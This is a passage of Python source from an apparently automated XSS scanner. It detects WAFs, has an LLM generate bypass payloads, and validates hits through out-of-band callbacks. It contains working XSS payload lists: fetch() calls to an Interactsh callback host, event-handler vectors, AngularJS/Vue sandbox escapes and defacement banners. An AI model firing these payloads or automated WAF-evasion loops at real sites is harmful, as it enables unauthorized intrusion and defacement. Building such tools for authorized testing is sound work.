"""
LLM analyze/bypass/WAF and remaining medium shell.

Shell mixin extracted from xss_agent.py (hard max 1500 LOC per module for agent work).
"""
from __future__ import annotations

# --- shell runtime deps (mixin methods used these from xss_agent module scope) ---
import asyncio
import aiohttp
import json
import re
import urllib.parse
import html as html_module
from dataclasses import asdict
from pathlib import Path
from typing import Any, Dict, List, Optional, Tuple, Union, Iterable

from bugtrace.utils.logger import get_logger
from bugtrace.core.ui import dashboard
from bugtrace.core.config import settings
from bugtrace.core.llm_client import llm_client
from bugtrace.core.http_manager import http_manager, ConnectionProfile
from bugtrace.core.queue import queue_manager
from bugtrace.core.event_bus import EventType
from bugtrace.core.verbose_events import create_emitter
from bugtrace.core.validation_status import ValidationStatus, requires_cdp_validation, get_validation_status
from bugtrace.schemas.validation_feedback import ValidationFeedback, FailureReason
from bugtrace.tools.interactsh import InteractshClient
from bugtrace.tools.visual.verifier import XSSVerifier
from bugtrace.tools.headless import detect_dom_xss, detect_dom_xss_batch
from bugtrace.tools.external import external_tools
from bugtrace.tools.go_bridge import GoFuzzerBridge, FuzzResult, Reflection
from bugtrace.utils.payload_amplifier import PayloadAmplifier
from bugtrace.memory.payload_learner import PayloadLearner
from bugtrace.tools.manipulator.orchestrator import ManipulatorOrchestrator
from bugtrace.tools.manipulator.models import MutableRequest, MutationStrategy
from bugtrace.tools.manipulator.context_analyzer import ContextAnalyzer, ReflectionContext
from bugtrace.tools.waf import waf_fingerprinter, strategy_router, encoding_techniques
from bugtrace.agents.worker_pool import WorkerPool, WorkerConfig
from bugtrace.agents.specialist_utils import load_full_payload_from_json, load_full_finding_data
from bugtrace.reporting.standards import (
    get_cwe_for_vuln,
    get_remediation_for_vuln,
    normalize_severity,
    get_default_severity,
)
from bugtrace.agents.xss import coverage as xss_coverage
from bugtrace.agents.xss.types import XSSFinding, InjectionContext, ValidationMethod
from bugtrace.agents.xss.constants import (
    PROBE_STRING,
    PROBE_STRING_SAFE,
    OMNIPROBE_PAYLOAD,
    GOLDEN_PAYLOADS,
    FRAGMENT_PAYLOADS,
)
from bugtrace.agents.xss.finding_builder import (
    mask_auth_headers as _mask_auth_headers,
    auth_meta as _auth_meta,
    excerpt_around as _excerpt_around,
    build_raw_http as _build_raw_http,
    promote_repro as _promote_repro,
)
from bugtrace.agents.xss.waf import (
    detect_payload_encoding as _pure_detect_payload_encoding,
    record_bypass_result as _pure_record_bypass_result,
    get_waf_optimized_payloads as _pure_get_waf_optimized_payloads,
    bypass_try_waf_encoding as _pure_bypass_try_waf_encoding,
    generate_bypass_variant as _pure_generate_bypass_variant,
)
logger = get_logger(__name__)
from bugtrace.agents.xss.shell_constants import (
    _BROWSER_ONLY_CONTEXTS,
    _CDP_PROOF_LOCK,
    _L05_CHAR_PROBE,
    _LEGACY_PROBE_MARKER,
    _PROBE_NO_REFLECTION,
    _PROBE_NO_RESPONSE,
    _PROBE_REFLECTED,
    _REDIRECT_PARAM_SET,
    _REFLECTION_SNIPPET_RADIUS,
)
from bugtrace.agents.xss.context_reflection import as_context_set as _as_context_set
# --- end shell runtime deps ---

class XSSLlmMiscMixin:
    async def analyze_server_escaping(self, url: str, param: str) -> Dict[str, bool]:
        """
        Analyze server-side escaping behavior by sending special characters.
        Determines if dangerous characters (quotes, brackets) are reflected raw or escaped/stripped.
        """
        test_chars = {
            "single_quote": "'",
            "double_quote": '"',
            "backslash": "\\",
            "lt": "<",
            "gt": ">",
        }
        
        results = {}
        try:
             # Construct a probe with all chars wrapped in markers
             probe = "BT_TEST_" + "".join(test_chars.values()) + "_END"
             
             # Send payload via established channel
             response_html = await self._send_payload(param, probe)
             
             if response_html:
                 for name, char in test_chars.items():
                     # If raw char is NOT found, it means it was escaped or stripped -> Safe/Escaped
                     results[f"escapes_{name}"] = (char not in response_html)
             else:
                 # If no response or WAF block, assume everything is filtered/blocked
                 for name in test_chars: results[f"escapes_{name}"] = True
                 
        except Exception as e:
             logger.warning(f"Failed to analyze server escaping: {e}")
             for name in test_chars: results[f"escapes_{name}"] = "unknown"
             
        return results

    async def _detect_waf_async(self) -> Tuple[str, float]:
        """
        Detect WAF using framework's intelligent fingerprinter.
        Caches result in instance variables.
        """
        if self._detected_waf is not None:
            return self._detected_waf, self._waf_confidence

        try:
            waf_name, confidence = await waf_fingerprinter.detect(self.url)
            self._detected_waf = waf_name if waf_name != "unknown" else None
            self._waf_confidence = confidence

            if self._detected_waf:
                logger.info(f"[{self.name}] 🛡️ WAF Detected: {waf_name} ({confidence:.0%} confidence)")
                dashboard.log(f"[{self.name}] 🛡️ WAF Detected: {waf_name} ({confidence:.0%})", "INFO")
                if hasattr(self, '_v'):
                    self._v.emit("exploit.xss.waf_detected", {"waf": waf_name, "confidence": round(confidence, 2)})

            return waf_name, confidence
        except Exception as e:
            logger.debug(f"[{self.name}] WAF detection failed: {e}")
            return "unknown", 0.0

    async def _get_waf_optimized_payloads(self, base_payloads: List[str], max_variants: int = 3) -> List[str]:
        """
        Apply Q-Learning optimized encoding to payloads based on detected WAF.

        Uses strategy_router to select best encoding techniques for the WAF.
        Records success/failure for continuous learning.
        """
        if not self._detected_waf:
            return base_payloads

        try:
            # Get Q-Learning optimized strategies for this WAF
            waf_name, strategies = await strategy_router.get_strategies_for_target(
                self.url, max_strategies=max_variants
            )

            logger.info(f"[{self.name}] 🧠 Q-Learning selected encodings for {waf_name}: {strategies[:3]}")

            # Generate encoded variants of payloads
            encoded_payloads = []
            for payload in base_payloads[:20]:  # Limit base payloads to avoid explosion
                # Add original payload first
                encoded_payloads.append(payload)

                # Apply each Q-Learning selected encoding
                variants = encoding_techniques.encode_payload(
                    payload,
                    waf=waf_name,
                    max_variants=max_variants
                )
                encoded_payloads.extend(variants)

            # Deduplicate while preserving order
            seen = set()
            unique_payloads = []
            for p in encoded_payloads:
                if p not in seen:
                    seen.add(p)
                    unique_payloads.append(p)

            logger.info(f"[{self.name}] Generated {len(unique_payloads)} WAF-optimized payloads (from {len(base_payloads)} base)")
            return unique_payloads

        except Exception as e:
            logger.warning(f"[{self.name}] WAF payload optimization failed: {e}")
            return base_payloads

    async def _loop_setup_waf_and_interactsh(self) -> str:
        """Phase 0-1: WAF detection and Interactsh registration."""
        # Phase 0: WAF Detection
        dashboard.log(f"[{self.name}] 🛡️ Detecting WAF...", "INFO")
        logger.info(f"[{self.name}] Phase 0: WAF Detection using Q-Learning fingerprinter")
        waf_name, waf_confidence = await self._detect_waf_async()

        if self._detected_waf:
            dashboard.log(f"[{self.name}] 🛡️ WAF: {waf_name} ({waf_confidence:.0%}) - Activating Q-Learning bypass strategies", "WARN")
            self.stealth_mode = True  # Auto-enable stealth for WAF targets
        else:
            dashboard.log(f"[{self.name}] ✓ No WAF detected", "SUCCESS")

        # Phase 1: Setup Interactsh
        dashboard.log(f"[{self.name}] 📡 Registering with Interactsh...", "INFO")
        logger.info(f"[{self.name}] Phase 1: Registering with Interactsh")
        self.interactsh = InteractshClient()
        await self.exec_tool("Interactsh_Register", self.interactsh.register, timeout=30)
        interactsh_domain = self.interactsh.get_url("xss_agent_base")
        dashboard.log(f"[{self.name}] ✓ Interactsh ready: {interactsh_domain}", "SUCCESS")

        return interactsh_domain

    async def _smart_get_llm_payloads(
        self,
        html: str,
        param: str,
        interactsh_url: str,
        context_data: Dict
    ) -> Optional[List[Dict]]:
        """Get LLM-generated smart payloads based on DOM analysis."""
        dashboard.log(f"[{self.name}] 🧠 LLM Brain: Analyzing DOM structure...", "INFO")

        smart_payloads = await self._llm_smart_dom_analysis(
            html=html,
            param=param,
            probe_string=self.PROBE_STRING,
            interactsh_url=interactsh_url,
            context_data=context_data
        )

        if smart_payloads:
            dashboard.log(f"[{self.name}] 🎯 Testing {len(smart_payloads)} LLM-generated precision payloads", "INFO")

        return smart_payloads

    async def _test_smart_llm_payloads(
        self,
        param: str,
        html: str,
        context_data: Dict,
        interactsh_url: str,
        screenshots_dir: Path,
        reflection_type: str,
        surviving_chars: str,
        injection_ctx: Any
    ) -> Optional[XSSFinding]:
        """Phase 2: Test LLM-generated smart payloads."""
        if not context_data.get("reflected", False):
            return None

        smart_payloads = await self._smart_get_llm_payloads(
            html, param, interactsh_url, context_data
        )
        if not smart_payloads:
            return None

        for sp in smart_payloads:
            if self._max_impact_achieved:
                break

            payload = sp["payload"]
            dashboard.set_current_payload(payload[:60], "XSS Smart", "Testing")

            finding = await self._smart_validate_and_build_finding(
                param, sp, payload, screenshots_dir, reflection_type,
                surviving_chars, injection_ctx
            )
            if finding:
                return finding

        return None

    async def _llm_analyze(self, html: str, param: str, interactsh_url: str, context_data: Dict = None) -> Optional[Dict]:
        """Ask LLM to analyze HTML and generate payload."""
        import json
        context_str = json.dumps(context_data or {}, indent=2)

        system_prompt = self._analyze_build_system_prompt(interactsh_url, context_str)

        user_prompt = f"""Target URL: {self.url}
Parameter: {param}
Probe: {self.PROBE_STRING}
Interactsh: {interactsh_url}

HTML Reflection Source (truncated):
```html
{html[:12000]}
```

Generate the OPTIMAL XSS payload based on the metadata and HTML.
"""

        try:
            response = await llm_client.generate(
                prompt=user_prompt,
                module_name="XSS_AGENT",
                system_prompt=system_prompt,
                model_override=settings.MUTATION_MODEL,
                max_tokens=8000  # Increased for reasoning models
            )

            logger.info(f"LLM Raw Response ({len(response)} chars)")
            return self._analyze_parse_response(response, param)

        except Exception as e:
            logger.error(f"LLM analysis failed: {e}", exc_info=True)
            return None

    async def _llm_generate_bypass(self, previous_payload: str, response_snippet: str, interactsh_url: str) -> Optional[Dict]:
        """Ask LLM to generate bypass payload."""
        bypass_prompt_template = """The previous payload did not trigger a callback.
Previous payload: {previous_payload}
HTTP Response: {response_snippet}
Analyze why it failed and generate a BYPASS payload with {interactsh_url}.

Response Format (XML-Like):
<thought>Analysis of failure</thought>
<bypass_payload>New payload to try</bypass_payload>
<confidence>0.1 to 1.0</confidence>
"""

        if self.system_prompt and "# XSS Bypass Prompt" in self.system_prompt:
             bypass_prompt_template = self.system_prompt.split("# XSS Bypass Prompt")[1].strip()

        prompt = bypass_prompt_template.replace("{previous_payload}", previous_payload) \
                                       .replace("{response_snippet}", response_snippet[:3000]) \
                                       .replace("{interactsh_url}", interactsh_url)
        
        try:
            response = await llm_client.generate(
                prompt=prompt,
                module_name="XSS_AGENT_BYPASS",
                system_prompt="You are a WAF bypass expert. Respond ONLY in XML tags: <bypass_payload>, <confidence>.",
                model_override=settings.MUTATION_MODEL,
            )
            
            from bugtrace.utils.parsers import XmlParser
            tags = ["bypass_payload", "confidence"]
            data = XmlParser.extract_tags(response, tags)
            
            if data.get("bypass_payload"):
                data["bypass_payload"] = self._clean_payload(data["bypass_payload"], "fake") # we clean but without specific param if unknown
                return data
            return None
            
        except Exception as e:
            logger.error(f"LLM bypass generation failed: {e}", exc_info=True)
            return None

    async def handle_validation_feedback(
        self,
        feedback: ValidationFeedback
    ) -> Optional[Dict[str, Any]]:
        """
        Recibe feedback del AgenticValidator y genera una variante adaptada.

        Este método se llama cuando el validador no pudo ejecutar un payload
        y necesita una variante basada en el contexto observado.

        Args:
            feedback: Información detallada sobre por qué falló el payload

        Returns:
            Diccionario con el nuevo payload y metadata, o None si no hay variante
        """
        logger.info(
            f"[XSSAgent] Received validation feedback for {feedback.parameter}: "
            f"reason={feedback.failure_reason.value}"
        )

        original = feedback.original_payload

        # Try specific strategy for failure reason
        variant, method = await self._generate_variant_for_reason(feedback, original)

        # Fallback to LLM if no variant generated
        if not variant or variant == original:
            variant, method = await self._generate_llm_fallback_variant(feedback, original)

        # Guard: variant must be unique and different from original
        if not variant:
            logger.warning("[XSSAgent] Could not generate unique variant")
            return None

        if variant == original:
            logger.warning("[XSSAgent] Generated variant same as original")
            return None

        if feedback.was_variant_tried(variant):
            logger.warning("[XSSAgent] Generated variant already tried")
            return None

        logger.info(f"[XSSAgent] Generated variant via {method}: {variant[:60]}...")
        return {
            "payload": variant,
            "method": method,
            "parent_payload": original,
            "adaptation_reason": feedback.failure_reason.value
        }

    def _bypass_try_waf_encoding(
        self,
        original_payload: str,
        waf_signature: str,
        tried_variants: List[str]
    ) -> Optional[str]:
        """Generate WAF bypass variant using Q-Learning encoding.
        Delegates to bugtrace.agents.xss.waf.bypass_try_waf_encoding."""
        if not waf_signature or waf_signature.lower() == "no identificado":
            return None

        logger.info(f"[XSSAgent] WAF detected ({waf_signature}), using intelligent encoding...")
        # NOTE: _get_waf_optimized_payloads is async but called sync here.
        # This is a pre-existing issue preserved for backward compatibility.
        encoded_variants = self._get_waf_optimized_payloads([original_payload], max_variants=5)

        variant, _ = _pure_bypass_try_waf_encoding(
            original_payload, waf_signature, tried_variants,
            encoded_variants if isinstance(encoded_variants, list) else []
        )
        if variant:
            logger.info(f"[XSSAgent] Generated WAF bypass variant: {variant[:80]}...")
        return variant

    async def generate_bypass_variant(
        self,
        original_payload: str,
        failure_reason: str,
        waf_signature: Optional[str] = None,
        stripped_chars: Optional[str] = None,
        detected_context: Optional[str] = None,
        tried_variants: Optional[List[str]] = None
    ) -> Optional[str]:
        """
        Generate a bypass XSS payload variant based on failure feedback.
        Delegates to bugtrace.agents.xss.waf.generate_bypass_variant.

        Args:
            original_payload: The payload that failed
            failure_reason: Why it failed (waf_blocked, chars_filtered, etc.)
            waf_signature: WAF identifier if detected
            stripped_chars: Characters that were filtered
            detected_context: HTML context where payload was reflected
            tried_variants: List of already-tried variants

        Returns:
            New payload string, or None if all strategies exhausted
        """
        logger.info(f"[XSSAgent] Generating bypass variant for failed payload: {original_payload[:50]}...")
        tried = tried_variants or []

        # Pre-compute encoded variants for WAF bypass (async pipeline)
        encoded_variants = []
        if waf_signature and waf_signature.lower() != "no identificado":
            encoded_variants = await self._get_waf_optimized_payloads([original_payload], max_variants=5)

        result = _pure_generate_bypass_variant(
            original_payload=original_payload,
            failure_reason=failure_reason,
            waf_signature=waf_signature,
            stripped_chars=stripped_chars,
            detected_context=detected_context,
            tried_variants=tried,
            encoded_variants=encoded_variants,
        )

        if not result:
            logger.warning("[XSSAgent] Could not generate new variant (all strategies exhausted)")
        return result

    def _fallback_visual_payloads(self) -> List[str]:
        """Generate fallback visual payloads if LLM fails."""
        JS_VISUAL = "var d=document.createElement(`div`);d.style=`position:fixed;top:0;left:0;width:100%;background:red;color:white;text-align:center;padding:20px;z-index:99999`;d.innerText=`HACKED BY BUGTRACEAI`;document.body.prepend(d);//"
        HTML_VISUAL = '<div style="position:fixed;top:0;left:0;width:100%;background:red;color:white;text-align:center;padding:20px;z-index:99999">HACKED BY BUGTRACEAI</div>'

        # JS_VISUAL with single quotes instead of backticks for event handlers
        JS_VISUAL_SQ = JS_VISUAL.replace('`', "'")

        fallback = [
            f"\\';{JS_VISUAL}",
            f"\\\";{JS_VISUAL}",
            f"';{JS_VISUAL}",
            f"\";{JS_VISUAL}",
            f"\">{HTML_VISUAL}",
            f"'>{HTML_VISUAL}",
            f"</script>{HTML_VISUAL}<script>",
            f'<svg onload="{JS_VISUAL_SQ}">',
            f'<img src=x onerror="{JS_VISUAL_SQ}">',
            f'<details open ontoggle="{JS_VISUAL_SQ}">',
        ]
        return fallback

    def _check_contexts(self, html: str, probe: str, escaped_probe: str) -> list:
        """Check all contexts and return found ones."""
        contexts = []
        if re.search(r'<script[^>]*>.*?' + escaped_probe + r'.*?</script>', html, re.DOTALL | re.IGNORECASE):
            contexts.append(("script", self._get_snippet(html, probe)))
        if re.search(r"['`\"][^'`\"]*" + escaped_probe + r"[^'`\"]*['`\"]", html):
            contexts.append(("javascript_string", self._get_snippet(html, probe)))
        if re.search(r'<[^>]+\s\w+=["\']?[^"\']*' + escaped_probe, html):
            contexts.append(("html_attribute", self._get_snippet(html, probe)))
        if re.search(r'href=["\']?[^"\']*' + escaped_probe, html, re.IGNORECASE):
            contexts.append(("url_href", self._get_snippet(html, probe)))
        if re.search(r'src=["\']?[^"\']*' + escaped_probe, html, re.IGNORECASE):
            contexts.append(("url_src", self._get_snippet(html, probe)))
        if re.search(r'on\w+=["\'][^"\']*' + escaped_probe, html, re.IGNORECASE):
            contexts.append(("event_handler", self._get_snippet(html, probe)))
        if re.search(r'>[^<]*' + escaped_probe + r'[^<]*<', html):
            contexts.append(("html_body", self._get_snippet(html, probe)))
        if re.search(r'<!--[^>]*' + escaped_probe + r'[^>]*-->', html):
            contexts.append(("html_comment", self._get_snippet(html, probe)))
        return contexts

    def _get_context_payload_map(self) -> Dict[str, List[str]]:
        """Return mapping of contexts to payload templates."""
        return {
            "script": [
                "';fetch('https://{{interactsh_url}}');//",
                "\";fetch('https://{{interactsh_url}}');//",
                "`;fetch('https://{{interactsh_url}}');//",
                "</script><script>fetch('https://{{interactsh_url}}')</script>",
            ],
            "javascript_string": [
                "'-fetch('https://{{interactsh_url}}')-'",
                "\"-fetch('https://{{interactsh_url}}')-\"",
                "\\');fetch('https://{{interactsh_url}}');//",
            ],
            "html_attribute": [
                "\" onmouseover=\"fetch('https://{{interactsh_url}}')\" x=\"",
                "' onmouseover='fetch(`https://{{interactsh_url}}`)' x='",
                "\"><svg/onload=fetch('https://{{interactsh_url}}')>",
            ],
            "url_context": [
                "javascript:fetch('https://{{interactsh_url}}')",
                "data:text/html,<script>fetch('https://{{interactsh_url}}')</script>",
            ],
            "event_handler": [
                "fetch('https://{{interactsh_url}}')",
                "';fetch('https://{{interactsh_url}}');//",
            ],
            "html_body": [
                "<img src=x onerror=fetch('https://{{interactsh_url}}')>",
                "<svg/onload=fetch('https://{{interactsh_url}}')>",
                "<script>fetch('https://{{interactsh_url}}')</script>",
            ],
            # Framework template injection payloads (AngularJS, Vue, etc.)
            "template": [
                "{{constructor.constructor('fetch(\"https://{{interactsh_url}}\")')()}}",
                "{{constructor.constructor('alert(1)')()}}",
                "{{$on.constructor('alert(1)')()}}",
                "{{'a'.constructor.prototype.charAt=[].join;$eval('x=1} } };alert(1)//');}}",
                "{{x=valueOf.name.constructor.fromCharCode;constructor.constructor(x(97,108,101,114,116,40,49,41))()}}",
                # Vue.js
                "{{_c.constructor('alert(1)')()}}",
            ],
        }

    def _determine_validation_status(self, test_result: Dict) -> Tuple[str, bool]:
        """Pure owner: xss.policy.determine_validation_status (+ log shell)."""
        from bugtrace.agents.xss import policy as _pol

        if not settings.XSS_SELF_VALIDATE:
            logger.debug(
                f"[{self.name}] Self-validation disabled in config. Deferring to Auditor."
            )
            return "PENDING_VALIDATION", False

        status, validated = _pol.determine_validation_status(
            test_result, self_validate=True
        )
        if validated:
            # Log which authority path fired without re-implementing the gate.
            evidence = test_result.get("evidence", {}) or {}
            if _pol.has_interactsh_hit(evidence):
                pass  # already logged via _has_* when used elsewhere
            else:
                logger.info(f"[{self.name}] 🚨 SELF-VALIDATED XSS (Authority Evidence Found)")
        else:
            logger.debug(
                f"[{self.name}] No authority evidence found, marking PENDING_VALIDATION"
            )
        return status, validated

    async def _loop_test_additional_vectors(self, interactsh_domain: str, screenshots_dir: Path):
        """Phase 4: Additional attack vectors (POST, Headers)."""
        if self._max_impact_achieved:
            return

        # 4.1: Test POST forms
        dashboard.log(f"[{self.name}] 📝 Phase 4.1: Testing POST forms...", "INFO")
        try:
            post_findings = await self._discover_and_test_post_forms(
                interactsh_domain, screenshots_dir
            )
            for pf in post_findings:
                self.findings.append(pf)
                if self._max_impact_achieved:
                    break
            if post_findings:
                dashboard.log(f"[{self.name}] 🎯 POST XSS found: {len(post_findings)} hits!", "SUCCESS")
        except Exception as e:
            logger.debug(f"POST form testing failed: {e}")

    async def _try_early_l5_validation(self, finding, url: str, param: str, payloads: List[str], screenshots_dir: Path):
        """If HTTP probe confirms XSS, automatically try L5 Browser Validation to get screenshot."""
        _depth = getattr(self, '_scan_depth', '') or settings.SCAN_DEPTH
        method = getattr(self, '_current_http_method', 'GET')
        if _depth != "thorough" or method != "GET":
            return finding
            
        logger.info(f"[{self.name}] Confirmed via HTTP. Elevating to L5 (Browser) for screenshot/PoC on '{param}'...")
        
        test_payloads = []
        if finding.payload and finding.payload not in test_payloads:
            test_payloads.append(finding.payload)
            
        alt = finding.payload.replace("document.title=document.domain", "alert(document.domain)")
        if alt != finding.payload and alt not in test_payloads:
            test_payloads.append(alt)
            
        for p in payloads:
            if p not in test_payloads:
                test_payloads.append(p)
                
        l5_res = await self._escalation_l5_browser(url, param, test_payloads[:10], screenshots_dir)
        if l5_res and l5_res.validated:
            return l5_res
            
        return finding

    async def _load_xss_tech_context(self) -> None:
        """
        Load technology stack context from recon data (v3.2).

        Uses TechContextMixin to:
        1. Load tech_profile.json from report directory
        2. Normalize into server/lang/framework context
        3. Generate XSS-specific prime directive for LLM prompts

        This context helps focus XSS payloads on the detected frontend/backend stack.
        """
        # Resolve report directory
        scan_dir = getattr(self, 'report_dir', None)
        if not scan_dir:
            # Fallback: construct from scan_context
            scan_id = self._scan_context.split("/")[-1] if self._scan_context else ""
            scan_dir = settings.BASE_DIR / "reports" / scan_id if scan_id else None

        if not scan_dir or not Path(scan_dir).exists():
            logger.debug(f"[{self.name}] No report directory found, using generic tech context")
            self._tech_stack_context = {"db": "generic", "server": "generic", "lang": "generic"}
            self._xss_prime_directive = ""
            return

        # Use TechContextMixin methods
        self._tech_stack_context = self.load_tech_stack(Path(scan_dir))
        self._xss_prime_directive = self.generate_xss_context_prompt(self._tech_stack_context)

        lang = self._tech_stack_context.get("lang", "generic")
        server = self._tech_stack_context.get("server", "generic")
        waf = self._tech_stack_context.get("waf")

        logger.info(f"[{self.name}] XSS tech context loaded: lang={lang}, server={server}, waf={waf or 'none'}")

    def _payload_process_validation_result(
        self,
        validated: bool,
        finding_data: Optional[Dict],
        reflected_payload: str,
        evidence: Optional[Dict],
        reflection_type: str,
        successful_payloads: List[str],
        best_state: Dict
    ) -> Tuple[List[str], Dict]:
        """Process validation result and update tracking state."""
        if not validated or not self._should_create_finding(finding_data):
            return successful_payloads, best_state

        self.payload_learner.save_success(reflected_payload, reflection_type, self.url)
        successful_payloads.append(reflected_payload)

        if not best_state.get("payload"):
            best_state = {
                "payload": reflected_payload,
                "evidence": evidence,
                "finding_data": finding_data
            }

        return successful_payloads, best_state

    async def _probe_parameter(self, param: str) -> Tuple[str, str, int]:
        """Send probe string and get HTML response."""
        from urllib.parse import urlparse, parse_qs, urlencode, urlunparse
        
        parsed = urlparse(self.url)
        params = {k: v[0] if isinstance(v, list) else v for k, v in parse_qs(parsed.query).items()}
        params[param] = self.PROBE_STRING
        
        probe_url = urlunparse((
            parsed.scheme, parsed.netloc, parsed.path,
            parsed.params, urlencode(params), parsed.fragment
        ))
        
        headers = {
            "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
            "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8"
        }
        
        try:
            # Use HTTPClientManager for proper connection management (v2.4)
            async with http_manager.session(ConnectionProfile.PROBE) as session:
                async with session.get(probe_url, headers=headers, ssl=False) as resp:
                    html = await resp.text()
                    logger.info(f"[{self.name}] Probe status: {resp.status} for {probe_url}")
                    return html, probe_url, resp.status
        except Exception as e:
            logger.warning(f"[{self.name}] Probe failed (WAF suspected) for {probe_url}: {e}")
            # If probe fails (WAF drops connection or blocks), we return specific flags
            # allowing the main loop to try "Stealth Mode" or "Blind Golden Payloads"
            # Return empty HTML but valid URL to ensure the loop continues
            return "", probe_url, 0

    def _dom_build_user_prompt(
        self,
        html: str,
        param: str,
        probe_string: str,
        interactsh_url: str,
        context_data: Dict,
        dom_snippet: str
    ) -> str:
        """Pure owner: xss.dom.build_dom_user_prompt."""
        from bugtrace.agents.xss.dom import build_dom_user_prompt

        return build_dom_user_prompt(
            self.url,
            html,
            param,
            probe_string,
            interactsh_url,
            context_data,
            dom_snippet,
        )

    async def _validate(
        self,
        param: str,
        payload: str,
        response_html: str,
        screenshots_dir: Path
    ) -> tuple:
        """
        4-LEVEL VALIDATION PIPELINE (V2.0)
        Ref: BugTraceAI-CLI/docs/architecture/xss-validation-pipeline.md

        Level Hierarchy:
        1. L1: HTTP Static Reflection Check (Fastest, ~70% coverage)
        2. L2: AI-Powered Manipulator/Auditor (Smart contextual analysis)
        3. L3: Playwright Browser Execution (DOM/Client-side execution)
        4. L4: CDP Deep Protocol (Delegated to AgenticValidator for race conditions)
        """
        evidence = {"payload": payload}

        # Level 1: HTTP Static Reflection Check
        if await self._validate_http_reflection(param, payload, response_html, evidence):
            return True, evidence

        # Level 2: AI-Powered Manipulator (Reflection Audit)
        if await self._validate_with_ai_manipulator(param, payload, response_html, evidence):
            return True, evidence

        # Level 3: Playwright Browser Execution
        if self._requires_browser_validation(payload, response_html):
            if await self._validate_with_playwright(param, payload, screenshots_dir, evidence):
                return True, evidence

        # Level 4: Escalation (Return False to let Manager/Reactor escalate to AgenticValidator)
        logger.debug(f"[{self.name}] L1-L3 inconclusive, escalation to L4 (AgenticValidator) required")
        return False, evidence

    async def _validate_http_reflection(self, param: str, payload: str, response_html: str, evidence: Dict) -> bool:
        """Level 1: Fast HTTP static reflection and OOB check."""
        # Tier 1.1: OOB Interactsh (Definitive OOB)
        if await self._check_interactsh_hit(param, evidence):
            evidence["method"] = "L1: OOB Interactsh"
            evidence["level"] = 1
            return True

        # Ensure we have HTML for reflection check
        if not response_html:
            response_html = await self._send_payload(param, payload)
            if not response_html:
                return False

        # Tier 1.2: Accurate Context Analysis (checks for escaping)
        # Routed through the SAME gate every other level uses. Calling the individual
        # predicates here skipped the content-type suppression, so an API-backed form that
        # echoes the field into a JSON 422 body (DRF, Laravel, ProblemDetails) confirmed at
        # L1 even though L2/L3 would have rejected it — and L1 also never checked the JS
        # string breakout context, which is a straight recall gain.
        if self._can_confirm_from_http_response(payload, response_html, evidence):
            evidence["method"] = "L1: HTTP Static Reflection"
            evidence["level"] = 1
            evidence["status"] = "VALIDATED_CONFIRMED"
            return True

        # Note: Template expressions require browser evaluation, not confirmed here

        return False

    async def _check_interactsh_hit(self, param: str, evidence: Dict) -> bool:
        """Check for Interactsh OOB callback."""
        if not self.interactsh:
            return False

        await asyncio.sleep(1)
        label = f"xss_{param}".replace("-", "").replace("_", "")[:20]
        hit_data = await self.interactsh.check_hit(label)

        if hit_data:
            evidence["interactsh_hit"] = True
            evidence["interactions"] = [hit_data]
            if hasattr(self, '_v'):
                self._v.emit("exploit.xss.interactsh.callback", {"param": param, "level": "oob_check"})
            dashboard.log(f"[{self.name}] 🚨 OOB INTERACTION DETECTED!", "CRITICAL")
            return True

        return False

    def _can_confirm_from_http_response(
        self, payload: str, response_html: str, evidence: dict
    ) -> bool:
        """Confirm XSS from HTTP response. Pure owner: xss.reflection.

        Adapter injects content-type / CSP state, stamps repro on confirm.
        """
        from bugtrace.agents.xss import reflection as _refl
        from bugtrace.agents.xss.position import _XML_CONTENT_TYPES

        _ct = (
            getattr(self, "_last_response_content_type", "") or ""
        ).split(";")[0].strip().lower()
        # Keep agent flag for any sibling path that still reads it.
        self._response_is_xml = _ct in _XML_CONTENT_TYPES

        confirmed = _refl.can_confirm_from_http_response(
            payload,
            response_html,
            evidence,
            content_type=getattr(self, "_last_response_content_type", "") or "",
            csp_header=getattr(self, "_last_response_csp", "") or "",
            agent_name=self.name,
        )
        if confirmed:
            self._stamp_repro(evidence, payload, response_html)
        return confirmed

    def _stamp_repro(self, evidence: dict, payload: str, response_html: str) -> None:
        """Seed enrichment: persist the EXACT request (auth masked) that confirmed this
        finding, so the WEB AI Repeater can replay it instead of guessing GET-with-query."""
        req = getattr(self, "_last_confirming_request", None)
        if req:
            evidence["confirming_request"] = {
                "method": req.get("method", "GET"),
                "url": req.get("url", self.url),
                "headers": _mask_auth_headers(req.get("headers") or {}),
                "body": req.get("body"),
                "body_content_type": req.get("body_content_type"),
            }
            evidence["capture_method"] = "http_response_analysis"
        resp = getattr(self, "_last_confirming_response", None)
        if resp is not None:
            evidence["confirming_response"] = {
                "status": resp.get("status"),
                "excerpt": _excerpt_around(response_html or resp.get("text", "") or "", payload),
            }

    async def _post_send_request(
        self,
        form_action: str,
        test_data: Dict[str, str]
    ) -> Optional[str]:
        """Send POST request and return response HTML."""
        try:
            headers = {
                "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
                "Content-Type": "application/x-www-form-urlencoded"
            }

            # Use HTTPClientManager for proper connection management (v2.4)
            async with http_manager.session(ConnectionProfile.PROBE) as session:
                async with session.post(
                    form_action,
                    data=test_data,
                    headers=headers,
                    ssl=False,
                    allow_redirects=True
                ) as resp:
                    text = await resp.text()
                    # This response reaches the confirmation gate through _validate();
                    # without recording its content type the gate would judge it on the
                    # LAST GET's headers, and without the request the repro stamp would
                    # replay that GET instead of this POST.
                    self._last_response_content_type = resp.headers.get("Content-Type", "")
                    self._last_response_csp = resp.headers.get(
                        "Content-Security-Policy", "")
                    self._last_confirming_request = {
                        "method": "POST", "url": form_action, "headers": dict(headers),
                        "body": urllib.parse.urlencode(test_data),
                        "body_content_type": "application/x-www-form-urlencoded",
                    }
                    self._last_confirming_response = {"status": resp.status, "text": text}
                    return text
        except Exception as e:
            logger.debug(f"POST request failed: {e}")
            self._last_response_content_type = ""
            self._last_response_csp = ""
            return None

    async def _generate_variant_for_reason(
        self,
        feedback: ValidationFeedback,
        original: str
    ) -> Tuple[Optional[str], str]:
        """Generate variant based on specific failure reason."""
        reason = feedback.failure_reason

        # Guard: WAF blocked
        if reason == FailureReason.WAF_BLOCKED:
            return await self._handle_waf_blocked(original)

        # Guard: Context mismatch
        if reason == FailureReason.CONTEXT_MISMATCH:
            return self._handle_context_mismatch(feedback, original)

        # Guard: Encoding stripped
        if reason == FailureReason.ENCODING_STRIPPED:
